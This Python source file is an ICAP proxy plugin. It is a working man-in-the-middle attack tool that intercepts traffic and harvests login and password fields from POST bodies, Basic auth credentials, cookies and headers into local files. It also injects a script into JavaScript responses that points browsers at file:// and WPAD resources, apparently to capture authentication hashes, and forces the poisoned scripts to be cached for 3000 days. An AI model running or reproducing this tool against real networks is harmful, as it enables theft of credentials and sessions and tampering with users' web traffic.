#!/bin/env python
# -*- coding: utf8 -*-

import random
import SocketServer
import re
import json
import traceback
import gzip
from threading import Thread
from pyicap import *
from dateutil import parser
from datetime import *
from StringIO import *

credentials_file = 'credentials.txt'
log_file = 'log.txt'
cookies_file = 'cookies.txt'
inject_file = 'injected.txt'
headers_file = 'headers.txt'

script = ';$(document).ready(function(){$(\'<img src="file://[ip]/resource/logo.jpg"><img src="http://WPAD/avatar.jpg">\');});'
days = 3000

port = 1344

def log_to_file(path, log):
        f = open(path, 'a+')
        f.write(log + '\n')
        f.close()


def extract_login_password(date, ip, url, body):
        usernames = []
        passwords = []

        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                                'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                                'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                                'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                                'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                                'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                                'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena', 'secret']
        logins = ['login', 'log-in', 'log_in', 'signin', 'sign-in', 'logon', 'log-on']

        for login in userfields:
                login_re = re.search('([^&]*%s[^=]*=[^&]+)' % login, body, re.IGNORECASE)
                if login_re and len(login_re.group()) < 75:
                        usernames.append(login_re.group())
        for passfield in passfields:
                pass_re = re.search('([^&]*%s[^=]*=[^&]+)' % passfield, body, re.IGNORECASE)
                if pass_re and len(pass_re.group()) < 75:
                        passwords.append(pass_re.group())

        if len(usernames) > 0 and len(passwords) > 0:
                log = {'date': date, 'ip': ip, 'type': 'login_password', 'url': url, 'usernames': usernames, 'passwords': passwords}
                log_string = json.dumps(log, indent=4)
                log_to_file(credentials_file, log_string)
                print log_string

        for login in logins:
                if re.search(login, url, re.IGNORECASE):
                        log = {'date': date, 'ip': ip, 'type': 'login_url', 'url': url, 'body': body}
                        log_string = json.dumps(log, indent=4)
                        log_to_file(credentials_file, log_string)


class ThreadingSimpleServer(SocketServer.ThreadingMixIn, ICAPServer):
        pass


class ICAPHandler(BaseICAPRequestHandler):
        def password_OPTIONS(self):
                self.set_icap_response(200)
                #self.set_icap_header('Methods', 'RESPMOD')
                self.set_icap_header('Methods', 'REQMOD')
                self.set_icap_header('Preview', '0')
                self.send_headers(False)

        def password_REQMOD(self):
                try:
                        date = str(parser.parse(self.headers['date'][0]))
                        ip = self.headers['x-client-ip'][0]
                        method = self.enc_req[0]
                        url = self.enc_req[1]
                        log_string = '{0}\t{1}\t{2}\t{3}'.format(date, ip, method, url)
                        log_to_file(log_file, log_string)
                        #print log_string
                        if '204' not in self.allow and self.preview == None:
                                self.set_icap_response(200)
                                self.set_enc_request(' '.join(self.enc_req))
                                for h in self.enc_req_headers:
                                        for v in self.enc_req_headers[h]:
                                                self.set_enc_header(h, v)
                                if not self.has_body:
                                        self.send_headers(False)
                                        self.log_request(200)
                                        return
                                self.send_headers(True)
                        body = ''
                        while self.has_body:
                                #print 'read start'
                                chunk = self.read_chunk()
                                #print 'read done', len(chunk)
                                if '204' not in self.allow and self.preview == None:
                                        self.write_chunk(chunk)
                                if chunk == '':
                                        if method == 'POST':
                                                thread = Thread(target = extract_login_password, args = (date, ip, url, body))
                                                thread.start()
                                        break
                                elif method == 'POST':
                                        body += chunk
                        if '204' in self.allow or self.preview != None:
                                self.set_icap_response(204)
                                self.send_headers()
                        #self.no_adaptation_required()
                except:
                        traceback.print_exc()
                        raise

        #def password_RESPMOD(self):
        #        self.no_adaptation_required()

        def basic_OPTIONS(self):
                self.set_icap_response(200)
                #self.set_icap_header('Methods', 'RESPMOD')
                self.set_icap_header('Methods', 'REQMOD')
                self.set_icap_header('Preview', '0')
                self.send_headers(False)

        def basic_REQMOD(self):
                try:
                        date = str(parser.parse(self.headers['date'][0]))
                        ip = self.headers['x-client-ip'][0]
                        method = self.enc_req[0]
                        url = self.enc_req[1]
                        if 'authorization' in self.enc_req_headers and self.enc_req_headers['authorization'][0].startswith('Basic'):
                                cred = self.enc_req_headers['authorization'][0].split(' ')[1].decode('base64') 
                                log = {'date': date, 'ip': ip, 'type':'basic_auth', 'url': url, 'cred': cred}
                                log_string = json.dumps(log, indent=4)
                                log_to_file(credentials_file, log_string)
                                #print log_string
                        if '204' not in self.allow and self.preview == None:
                                self.set_icap_response(200)
                                self.set_enc_request(' '.join(self.enc_req))
                                for h in self.enc_req_headers:
                                        for v in self.enc_req_headers[h]:
                                                self.set_enc_header(h, v)
                                self.send_headers(True)
                        while self.has_body:
                                #print 'read start'
                                chunk = self.read_chunk()
                                #print 'read done', len(chunk)
                                if '204' not in self.allow and self.preview == None:
                                        self.write_chunk(chunk)
                                if chunk == '':
                                        break
                        if '204' in self.allow or self.preview != None:
                                self.set_icap_response(204)
                                self.send_headers()
                        #self.no_adaptation_required()
                except:
                        traceback.print_exc()
                        raise

        #def basic_RESPMOD(self):
        #        self.no_adaptation_required()

        def headers_OPTIONS(self):
                self.set_icap_response(200)
                #self.set_icap_header('Methods', 'RESPMOD')
                self.set_icap_header('Methods', 'REQMOD')
                self.set_icap_header('Preview', '0')
                self.send_headers(False)

        def headers_REQMOD(self):
                date = str(parser.parse(self.headers['date'][0]))
                ip = self.headers['x-client-ip'][0]
                method = self.enc_req[0]
                url = self.enc_req[1]
                for header in self.enc_req_headers:
                        log_string = '{0}\t{1}\t{2}\t{3}'.format(date, ip, url, self.enc_req_headers[header][0])
                        log_to_file(headers_file, log_string)
                self.no_adaptation_required()

        #def headers_RESPMOD(self):
        #        self.no_adaptation_required()


        def cookie_OPTIONS(self):
                self.set_icap_response(200)
                #self.set_icap_header('Methods', 'RESPMOD')
                self.set_icap_header('Methods', 'REQMOD')
                self.set_icap_header('Preview', '0')
                self.send_headers(False)

        def cookie_REQMOD(self):
                date = str(parser.parse(self.headers['date'][0]))
                ip = self.headers['x-client-ip'][0]
                method = self.enc_req[0]
                url = self.enc_req[1]
                if 'cookie' in self.enc_req_headers:
                        cookies = self.enc_req_headers['cookie'][0]
                        log_string = '{0}\t{1}\t{2}\t{3}'.format(date, ip, url, cookies)
                        log_to_file(cookies_file, log_string)
                self.no_adaptation_required()

        #def cookie_RESPMOD(self):
        #        self.no_adaptation_required()

        def inject_OPTIONS(self):
                self.set_icap_response(200)
                self.set_icap_header('Methods', 'RESPMOD')
                #self.set_icap_header('Methods', 'REQMOD')
                self.set_icap_header('Preview', '0')
                self.send_headers(False)

        #def inject_REQMOD(self):
        #        self.no_adaptation_required()

        def inject_RESPMOD(self):
                date = str(parser.parse(self.headers['date'][0]))
                ip = self.headers['x-client-ip'][0]
                method = self.enc_req[0]
                url = self.enc_req[1]
                referer = ''
                if 'referer' in self.enc_req_headers:
                        referer = self.enc_req_headers['referer'][0]
                agent = ''
                if 'user-agent' in self.enc_req_headers:
                        referer = self.enc_req_headers['user-agent'][0]
                status = self.enc_res_status[1]
                message = self.enc_res_status[2]
                if 'content-type' in self.enc_res_headers and 'javascript' in self.enc_res_headers['content-type'][0]: #re.search('^[^\?]*\.js(\?.*)?$', url):
                        log_string = '{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}'.format(date, ip, status, method, url, referer, agent)
                        log_to_file(inject_file, log_string)
                        print log_string
                        compress = 'uncompress'
                        if 'content-encoding' in self.enc_res_headers:
                                if 'gzip' in self.enc_res_headers['content-encoding']:
                                        compress = 'gzip'
                        if compress not in ['uncompress', 'gzip']:
                                self.no_adaptation_required()
                                return
                        body = ''
                        if self.has_body:
                                while True:
                                        chunk = self.read_chunk()
                                        body += chunk
                                        if chunk == '':
                                                break
                                if compress == 'gzip':
                                        buf = StringIO(body)
                                        body = gzip.GzipFile(fileobj=buf).read()
                                body += script
                                if compress == 'gzip':
                                        temp = ''
                                        buf = StringIO(temp)
                                        gzip.GzipFile(fileobj=buf, mode='w').write(body)
                                        body = buf.getvalue()
                        self.set_icap_response(200)
                        self.set_enc_status(' '.join(self.enc_res_status))
                        for h in self.enc_res_headers:
                                for v in self.enc_res_headers[h]:
                                        if h == 'content-length':
                                                self.set_enc_header(h, str(len(body)))
                                        elif h == 'cache-control':
                                                pass
                                        elif h == 'expires':
                                                pass
                                        elif h == 'etag':
                                                pass
                                        else:
                                                self.set_enc_header(h, v)
                        now = datetime.today()
                        delta = timedelta(days)
                        expires = now + delta
                        self.set_enc_header('expires', expires.strftime('%A, %d %b %Y %H:%M:%S GMT'))
                        self.set_enc_header('cache-control', 'max-age=' + str(int(delta.total_seconds())))
                        if not self.has_body:
                                self.send_headers(False)
                                return
                        self.send_headers(True)
                        self.write_chunk(body)
                        self.write_chunk('')
                        return
                self.no_adaptation_required()


server = ThreadingSimpleServer(('127.0.0.1', port), ICAPHandler)
try:
        while 1:
                server.handle_request()
except KeyboardInterrupt:
        print 'Finished'
